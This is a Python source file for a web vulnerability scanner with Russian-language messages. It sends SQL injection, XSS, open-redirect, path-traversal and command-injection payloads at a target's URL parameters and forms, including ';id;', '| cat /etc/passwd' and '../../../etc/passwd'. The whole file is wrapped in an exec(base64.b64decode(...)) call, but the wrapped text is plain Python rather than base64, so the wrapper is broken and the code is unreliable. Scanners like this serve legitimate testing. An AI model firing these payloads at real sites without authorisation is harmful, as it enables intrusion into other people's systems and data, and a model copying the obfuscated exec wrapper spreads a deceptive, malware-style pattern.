import base64;exec(base64.b64decode('import os
import socket
import re
import time
import requests
import ssl
import urllib3
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, quote
from bs4 import BeautifulSoup
from BruhPentest.utils import get_random_user_agent

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SecurityScanner:
    def __init__(self):
        self.sess = requests.Session()
        self.sess.headers.update({'User-Agent': get_random_user_agent()})

    def hit_endpoint(self, url, method="GET", data=None, headers=None, follow_redirects=True, verify=False, timeout=10):
        try:
            browser = {'User-Agent': get_random_user_agent()}
            if headers:
                browser.update(headers)

            if method.upper() == "GET":
                resp = self.sess.get(
                    url,
                    headers=browser,
                    allow_redirects=follow_redirects,
                    verify=verify,
                    timeout=timeout
                )
            elif method.upper() == "POST":
                resp = self.sess.post(
                    url,
                    data=data,
                    headers=browser,
                    allow_redirects=follow_redirects,
                    verify=verify,
                    timeout=timeout
                )
            elif method.upper() == "HEAD":
                resp = self.sess.head(
                    url,
                    headers=browser,
                    allow_redirects=follow_redirects,
                    verify=verify,
                    timeout=timeout
                )
            else:
                return None

            return resp
        except requests.RequestException:
            return None

    def check_ssl(self, url):
        if not url.startswith('https://'):
            print("[-] Сайт не юзает SSL/TLS")
            return {"secure": False, "issues": ["Сайт не юзает SSL/TLS"]}

        try:
            domain = urlparse(url).netloc.split(':')[0]
            ctx = ssl.create_default_context()
            with socket.create_connection((domain, 443)) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()

                    issues = []

                    not_after = datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                    if not_after < datetime.now():
                        issues.append("SSL серт просрочен")

                    issuer = dict(item[0] for item in cert['issuer'])
                    if 'organizationName' not in issuer:
                        issues.append("Серт выдан неизвестным центром")

                    if issues:
                        print("[-] Обнаружены проблемы с SSL:")
                        for issue in issues:
                            print(f"  - {issue}")
                        return {"secure": False, "issues": issues}
                    else:
                        print("[+] SSL настроен правильно")
                        return {"secure": True, "issues": []}
        except Exception as e:
            issue = f"Ошибка при проверке SSL: {str(e)}"
            print(f"[-] {issue}")
            return {"secure": False, "issues": [issue]}

    def check_headers(self, url):
        resp = self.hit_endpoint(url, method="HEAD")

        if not resp:
            return {"secure": False, "issues": ["Не удалось получить заголовки"]}

        headers = resp.headers
        sec_headers = {
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "no-referrer-when-downgrade"
        }

        missing = []
        weak = []

        for header, recommended in sec_headers.items():
            if header not in headers:
                missing.append(header)
            elif recommended and recommended not in headers[header]:
                weak.append(f"{header}: {headers[header]}")

        if missing or weak:
            print("[-] Отсутствуют или слабые заголовки безопасности:")
            for header in missing:
                print(f"  - Отсутствует: {header}")
            for header in weak:
                print(f"  - Слабый: {header}")
            return {"secure": False, "missing": missing, "weak": weak}
        else:
            print("[+] Все заголовки безопасности настроены правильно")
            return {"secure": True, "missing": [], "weak": []}

    def check_cookies(self, url):
        resp = self.hit_endpoint(url)

        if not resp:
            return {"secure": False, "issues": ["Не удалось получить куки"]}

        cookies = resp.cookies

        if not cookies:
            return {"secure": True, "issues": []}

        insecure_cookies = []

        for cookie in cookies:
            issues = []

            if not cookie.secure:
                issues.append("Нет флага Secure")

            if not cookie.has_nonstandard_attr("HttpOnly"):
                issues.append("Нет флага HttpOnly")

            if not cookie.has_nonstandard_attr("SameSite"):
                issues.append("Нет атрибута SameSite")

            if issues:
                insecure_cookies.append({"name": cookie.name, "issues": issues})

        if insecure_cookies:
            print("[-] Обнаружены небезопасные куки:")
            for cookie in insecure_cookies:
                print(f"  - {cookie['name']}: {', '.join(cookie['issues'])}")
            return {"secure": False, "insecure_cookies": insecure_cookies}
        else:
            print("[+] Все куки настроены безопасно")
            return {"secure": True, "insecure_cookies": []}

    def check_for_sql_injection(self, url, forms):
        sql_payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "' OR 1=1 --",
            "1' OR 1=1 --",
            "admin'--",
            "1' UNION SELECT 1,2,3,4,5 --",
            "1' AND 1=0 UNION SELECT 1,2,3,4,5 --",
            "1' AND 1=0 UNION SELECT 1,database(),3,4,5 --"
        ]

        vuln_endpoints = []

        print("[*] Проверяем параметры URL на SQL инъекции...")

        parsed_url = urlparse(url)

        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name, param_values in params.items():
                base_url = url.split('?')[0]

                for payload in sql_payloads:
                    test_url = f"{base_url}?{param_name}={quote(payload)}"
                    resp = self.hit_endpoint(test_url)

                    if resp and any(indicator in resp.text.lower() for indicator in [
                        "sql syntax", "mysql error", "unclosed quotation", "unterminated string",
                        "warning: mysql", "odbc drivers", "server error", "microsoft oledb",
                        "syntax error", "mysql_fetch", "getimagesize()", "mysqli_", "sybase"
                    ]):
                        vuln_endpoints.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "type": "GET"
                        })
                        print(f"[-] Найдена SQL инъекция: {test_url}")
                        break

        print("[*] Проверяем формы на SQL инъекции...")

        for form in forms:
            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "search", "email", "url", "password"]:
                    for payload in sql_payloads:
                        form_data = {}

                        for field in form["inputs"]:
                            if field["name"]:
                                if field["name"] == input_field["name"]:
                                    form_data[field["name"]] = payload
                                else:
                                    form_data[field["name"]] = field["value"] or "test"

                        if form["method"] == "GET":
                            query = "&".join([f"{k}={quote(v)}" for k, v in form_data.items()])
                            test_url = f"{form['action']}?{query}"
                            resp = self.hit_endpoint(test_url)
                        else:
                            resp = self.hit_endpoint(form["action"], method="POST", data=form_data)

                        if resp and any(indicator in resp.text.lower() for indicator in [
                            "sql syntax", "mysql error", "unclosed quotation", "unterminated string",
                            "warning: mysql", "odbc drivers", "server error", "microsoft oledb",
                            "syntax error", "mysql_fetch", "getimagesize()", "mysqli_", "sybase"
                        ]):
                            vuln_endpoints.append({
                                "url": form["action"],
                                "param": input_field["name"],
                                "payload": payload,
                                "type": form["method"]
                            })
                            print(f"[-] Найдена SQL инъекция в форме: {form['action']} (param: {input_field['name']})")
                            break

        if vuln_endpoints:
            return {"vulnerable": True, "endpoints": vuln_endpoints}
        else:
            print("[+] SQL инъекции не обнаружены")
            return {"vulnerable": False, "endpoints": []}

    def check_for_xss(self, url, forms):
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<body onload=alert(1)>",
            "<sCRipt>alert(1)</sCRipt>"
        ]

        vuln_endpoints = []

        print("[*] Проверяем параметры URL на XSS...")

        parsed_url = urlparse(url)

        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name, param_values in params.items():
                base_url = url.split('?')[0]

                for payload in xss_payloads:
                    test_url = f"{base_url}?{param_name}={quote(payload)}"
                    resp = self.hit_endpoint(test_url)

                    if resp and payload in resp.text:
                        vuln_endpoints.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "type": "GET"
                        })
                        print(f"[-] Найдена XSS: {test_url}")
                        break

        print("[*] Проверяем формы на XSS...")

        for form in forms:
            for input_field in form["inputs"]:
                if input_field["type"] in ["text", "search", "email", "url", "textarea"]:
                    for payload in xss_payloads:
                        form_data = {}

                        for field in form["inputs"]:
                            if field["name"]:
                                if field["name"] == input_field["name"]:
                                    form_data[field["name"]] = payload
                                else:
                                    form_data[field["name"]] = field["value"] or "test"

                        if form["method"] == "GET":
                            query = "&".join([f"{k}={quote(v)}" for k, v in form_data.items()])
                            test_url = f"{form['action']}?{query}"
                            resp = self.hit_endpoint(test_url)
                        else:
                            resp = self.hit_endpoint(form["action"], method="POST", data=form_data)

                        if resp and payload in resp.text:
                            vuln_endpoints.append({
                                "url": form["action"],
                                "param": input_field["name"],
                                "payload": payload,
                                "type": form["method"]
                            })
                            print(f"[-] Найдена XSS в форме: {form['action']} (param: {input_field['name']})")
                            break

        if vuln_endpoints:
            return {"vulnerable": True, "endpoints": vuln_endpoints}
        else:
            print("[+] XSS не обнаружены")
            return {"vulnerable": False, "endpoints": []}

    def check_for_open_redirect(self, url, forms):
        redirect_payloads = [
            "https://example.com",
            "//example.com",
            "\\\\example.com",
            "example.com",
            "%2F%2Fexample.com",
            "javascript:alert(document.domain)"
        ]

        vuln_endpoints = []

        print("[*] Проверяем параметры URL на открытое перенаправление...")

        parsed_url = urlparse(url)

        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name, param_values in params.items():
                if any(redirect_param in param_name.lower() for redirect_param in
                       ["redirect", "url", "next", "goto", "return", "returnto", "returnurl", "continue", "return_to",
                        "return_path", "path"]):
                    base_url = url.split('?')[0]

                    for payload in redirect_payloads:
                        test_url = f"{base_url}?{param_name}={quote(payload)}"
                        resp = self.hit_endpoint(test_url, follow_redirects=False)

                        if resp and resp.status_code in [301, 302, 303, 307, 308]:
                            location = resp.headers.get('Location', '')
                            if any(indicator in location for indicator in ["example.com", "javascript:"]):
                                vuln_endpoints.append({
                                    "url": test_url,
                                    "param": param_name,
                                    "payload": payload,
                                    "location": location
                                })
                                print(f"[-] Найдено открытое перенаправление: {test_url} -> {location}")
                                break

        if vuln_endpoints:
            return {"vulnerable": True, "endpoints": vuln_endpoints}
        else:
            print("[+] Открытые перенаправления не обнаружены")
            return {"vulnerable": False, "endpoints": []}

    def check_for_lfi(self, url):
        lfi_payloads = [
            "../../../etc/passwd",
            "../../../Windows/win.ini",
            "../../../../etc/passwd",
            "../../../../Windows/win.ini",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5cWindows%5cwin.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini"
        ]

        lfi_indicators = [
            "root:x:",
            "[fonts]",
            "mail:x:",
            "nobody:x:",
            "bin:x:",
            "daemon:x:"
        ]

        vuln_endpoints = []

        print("[*] Проверяем параметры URL на LFI...")

        parsed_url = urlparse(url)

        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name, param_values in params.items():
                base_url = url.split('?')[0]

                for payload in lfi_payloads:
                    test_url = f"{base_url}?{param_name}={quote(payload)}"
                    resp = self.hit_endpoint(test_url)

                    if resp and any(indicator in resp.text for indicator in lfi_indicators):
                        vuln_endpoints.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload
                        })
                        print(f"[-] Найдена LFI: {test_url}")
                        break

        if vuln_endpoints:
            return {"vulnerable": True, "endpoints": vuln_endpoints}
        else:
            print("[+] LFI не обнаружены")
            return {"vulnerable": False, "endpoints": []}

    def check_for_rce(self, url):
        rce_payloads = [
            "id",
            "whoami",
            "uname -a",
            "ls -la",
            ";id;",
            "& whoami &",
            "| cat /etc/passwd",
            "sleep 5"
        ]

        rce_indicators = [
            "uid=",
            "gid=",
            "root:x:",
            "Linux",
            "Windows"
        ]

        vuln_endpoints = []

        print("[*] Проверяем параметры URL на RCE...")

        parsed_url = urlparse(url)

        if parsed_url.query:
            params = parse_qs(parsed_url.query)

            for param_name, param_values in params.items():
                base_url = url.split('?')[0]

                for payload in rce_payloads:
                    test_url = f"{base_url}?{param_name}={quote(payload)}"

                    start_time = time.time()
                    resp = self.hit_endpoint(test_url)
                    end_time = time.time()

                    if resp and any(indicator in resp.text for indicator in rce_indicators):
                        vuln_endpoints.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "type": "pattern_match"
                        })
                        print(f"[-] Найден RCE: {test_url}")
                        break
                    elif payload == "sleep 5" and (end_time - start_time > 4.5):
                        vuln_endpoints.append({
                            "url": test_url,
                            "param": param_name,
                            "payload": payload,
                            "type": "time_based"
                        })
                        print(f"[-] Найден RCE (тайм-бейзд): {test_url}")
                        break

        if vuln_endpoints:
            return {"vulnerable": True, "endpoints": vuln_endpoints}
        else:
            print("[+] RCE не обнаружены")
            return {"vulnerable": False, "endpoints": []}

    def scan_vulnerabilities(self, url, scan_results=None):
        if scan_results is None:
            from BruhPentest.web_scanner import WebScanner
            web_scanner = WebScanner()
            scan_results = web_scanner.scan_website(url)

        vuln_results = {}

        print(f"[*] Начинаем проверку безопасности для: {url}")

        print(f"[*] Проверяем SSL/TLS...")
        vuln_results["ssl_check"] = self.check_ssl(url)

        print(f"[*] Проверяем заголовки безопасности...")
        vuln_results["headers_check"] = self.check_headers(url)

        print(f"[*] Проверяем безопасность кук...")
        vuln_results["cookies_check"] = self.check_cookies(url)

        print(f"[*] Проверяем на SQL инъекции...")
        vuln_results["sql_injection"] = self.check_for_sql_injection(url, scan_results.get("forms", []))

        print(f"[*] Проверяем на XSS...")
        vuln_results["xss"] = self.check_for_xss(url, scan_results.get("forms", []))

        print(f"[*] Проверяем на открытые редиректы...")
        vuln_results["open_redirect"] = self.check_for_open_redirect(url, scan_results.get("forms", []))

        print(f"[*] Проверяем на LFI...")
        vuln_results["lfi"] = self.check_for_lfi(url)

        print(f"[*] Проверяем на RCE...")
        vuln_results["rce"] = self.check_for_rce(url)

        print(f"[+] Проверка безопасности завершена!")

        return vuln_results').decode('utf-8'))